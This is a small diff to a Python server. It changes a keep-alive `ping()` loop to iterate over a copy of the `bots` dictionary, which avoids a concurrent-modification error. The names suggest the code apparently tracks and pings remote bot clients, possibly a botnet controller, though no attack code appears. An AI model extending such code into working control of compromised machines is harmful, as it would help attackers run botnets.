@@ -175,7 +175,7 @@ def loading(client):
 def ping():
     while 1:
         dead_bots = []
-        for bot in bots.keys():
+        for bot in bots.copy().keys():
             try:
                 bot.settimeout(3)
                 send(bot, 'PING', False, False)
